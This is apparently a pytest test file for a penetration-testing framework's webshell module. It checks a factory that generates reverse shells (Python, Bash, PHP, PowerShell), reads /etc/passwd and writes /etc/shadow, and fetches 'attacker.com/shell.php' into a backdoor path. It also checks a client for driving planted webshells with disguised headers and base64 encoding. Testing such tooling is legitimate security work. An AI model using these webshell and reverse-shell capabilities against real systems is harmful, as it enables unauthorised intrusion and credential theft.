"""Tests for webshell factory and client modules."""

import pytest

from ofx.api.exploitation.webshell import WebShellClient, WebShellCodeFactory


class TestWebShellCodeFactory:
    """Test WebShellCodeFactory class."""

    def test_reverse_shell_python(self):
        """Test Python reverse shell generation."""
        code = WebShellCodeFactory.reverse_shell("python", "192.168.1.1", 4444)
        assert "socket" in code
        assert "192.168.1.1" in code
        assert "4444" in code

    def test_reverse_shell_bash(self):
        """Test Bash reverse shell generation."""
        code = WebShellCodeFactory.reverse_shell("bash", "10.0.0.1", 8080)
        assert "/dev/tcp/" in code
        assert "10.0.0.1" in code
        assert "8080" in code

    def test_reverse_shell_php(self):
        """Test PHP reverse shell generation."""
        code = WebShellCodeFactory.reverse_shell("php", "172.16.1.1", 9999)
        assert "fsockopen" in code
        assert "172.16.1.1" in code
        assert "9999" in code

    def test_reverse_shell_powershell(self):
        """Test PowerShell reverse shell generation."""
        code = WebShellCodeFactory.reverse_shell("powershell", "192.168.1.100", 443)
        assert "TCPClient" in code
        assert "192.168.1.100" in code
        assert "443" in code

    def test_reverse_shell_unsupported(self):
        """Test unsupported language raises ValueError."""
        with pytest.raises(ValueError, match="Unsupported language"):
            WebShellCodeFactory.reverse_shell("cobol", "1.2.3.4", 1234)

    def test_read_file_python(self):
        """Test Python file read generation."""
        code = WebShellCodeFactory.read_file("python", "/etc/passwd")
        assert "open" in code
        assert "/etc/passwd" in code
        assert "read()" in code

    def test_read_file_php(self):
        """Test PHP file read generation."""
        code = WebShellCodeFactory.read_file("php", "/var/www/config.php")
        assert "file_get_contents" in code
        assert "/var/www/config.php" in code

    def test_read_file_jsp(self):
        """Test JSP file read generation."""
        code = WebShellCodeFactory.read_file("jsp", "/opt/app/data.xml", "ISO-8859-1")
        assert "Files.readAllBytes" in code
        assert "/opt/app/data.xml" in code
        assert "ISO-8859-1" in code

    def test_write_file_python(self):
        """Test Python file write generation."""
        code = WebShellCodeFactory.write_file("python", "/tmp/output.txt", "Test data")
        assert "open" in code
        assert "/tmp/output.txt" in code
        assert "write" in code
        assert "Test data" in code

    def test_write_file_php(self):
        """Test PHP file write generation."""
        code = WebShellCodeFactory.write_file("php", "/var/log/custom.log", "Log entry")
        assert "file_put_contents" in code
        assert "/var/log/custom.log" in code
        assert "Log entry" in code

    def test_run_command_python(self):
        """Test Python command execution generation."""
        code = WebShellCodeFactory.run_command("python", "whoami")
        assert "subprocess" in code or "os.system" in code
        assert "whoami" in code

    def test_run_command_php(self):
        """Test PHP command execution generation."""
        code = WebShellCodeFactory.run_command("php", "id", capture_output=True)
        assert "shell_exec" in code
        assert "id" in code

    def test_run_command_no_capture(self):
        """Test command execution without output capture."""
        code = WebShellCodeFactory.run_command("python", "ls -la", capture_output=False)
        assert "__import__('os').system" in code or "os.system" in code
        assert "ls -la" in code

    def test_list_directory_python(self):
        """Test Python directory listing generation."""
        code = WebShellCodeFactory.list_directory("python", "/home/user")
        assert "listdir" in code
        assert "/home/user" in code

    def test_list_directory_php(self):
        """Test PHP directory listing generation."""
        code = WebShellCodeFactory.list_directory("php", "/var/www/html")
        assert "scandir" in code
        assert "/var/www/html" in code

    def test_download_file_python(self):
        """Test Python file download generation."""
        code = WebShellCodeFactory.download_file(
            "python", "https://example.com/payload.exe", "/tmp/payload.exe"
        )
        assert "urllib" in code
        assert "https://example.com/payload.exe" in code
        assert "/tmp/payload.exe" in code

    def test_download_file_php(self):
        """Test PHP file download generation."""
        code = WebShellCodeFactory.download_file(
            "php", "http://attacker.com/shell.php", "/var/www/backdoor.php"
        )
        assert "file_get_contents" in code or "file_put_contents" in code
        assert "http://attacker.com/shell.php" in code
        assert "/var/www/backdoor.php" in code

    def test_upload_file_python(self):
        """Test Python file upload generation."""
        code = WebShellCodeFactory.upload_file("python", "/etc/shadow", "root:$6$...")
        assert "open" in code
        assert "/etc/shadow" in code
        assert "root:$6$..." in code

    def test_get_system_info_python(self):
        """Test Python system info generation."""
        code = WebShellCodeFactory.get_system_info("python")
        assert "platform" in code
        assert "os" in code

    def test_get_system_info_php(self):
        """Test PHP system info generation."""
        code = WebShellCodeFactory.get_system_info("php")
        assert "PHP_OS" in code or "gethostname" in code or "php_uname" in code


class TestWebShellClient:
    """Test WebShellClient class."""

    def test_client_initialization(self):
        """Test client initialization."""
        client = WebShellClient(
            url="http://example.com/shell.php",
            password="x",
            encoder="base64",
            secret_header="X-Token",
            secret_value="secret",
            timeout=10,
            verify_ssl=False,
        )

        assert client.url == "http://example.com/shell.php"
        assert client.password == "x"
        assert client.encoder == "base64"
        assert client.secret_header == "X-Token"
        assert client.secret_value == "secret"
        assert client.timeout == 10
        assert client.verify_ssl is False

        client.close()

    def test_client_default_values(self):
        """Test client with default values."""
        client = WebShellClient(url="http://target.com/webshell.jsp")

        assert client.password == "pass"
        assert client.encoder == "default"
        assert client.secret_header is None
        assert client.secret_value is None
        assert client.timeout == 30
        assert client.verify_ssl is True

        client.close()

    def test_encode_payload_base64(self):
        """Test base64 payload encoding."""
        client = WebShellClient(url="http://example.com/shell.php", encoder="base64")

        payload = "print('Hello World')"
        encoded = client._encode_payload(payload)

        # Base64 encoded should be different
        assert encoded != payload
        assert len(encoded) > 0

        # Should be decodable back
        import base64

        decoded = base64.b64decode(encoded).decode()
        assert decoded == payload

        client.close()

    def test_encode_payload_default(self):
        """Test default payload encoding (no encoding)."""
        client = WebShellClient(url="http://example.com/shell.php", encoder="default")

        payload = "system('whoami');"
        encoded = client._encode_payload(payload)

        # Default should not encode
        assert encoded == payload

        client.close()

    def test_context_manager(self):
        """Test context manager protocol."""
        with WebShellClient(url="http://example.com/shell.php") as client:
            assert client.session is not None
            assert hasattr(client, "url")

        # Session should be closed after exiting context
        # (we can't directly test this without accessing private attributes)

    def test_client_methods_exist(self):
        """Test that all expected methods exist."""
        client = WebShellClient(url="http://example.com/shell.php")

        assert hasattr(client, "execute")
        assert hasattr(client, "run_command")
        assert hasattr(client, "read_file")
        assert hasattr(client, "write_file")
        assert hasattr(client, "list_directory")
        assert hasattr(client, "download_file")
        assert hasattr(client, "upload_file")
        assert hasattr(client, "get_system_info")
        assert hasattr(client, "test_connection")
        assert hasattr(client, "close")

        client.close()

    def test_client_session_created(self):
        """Test that HTTP session is created."""
        client = WebShellClient(url="http://example.com/shell.php", timeout=15)

        assert client.session is not None
        # httpx.Client should have timeout attribute
        assert hasattr(client.session, "timeout")

        client.close()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
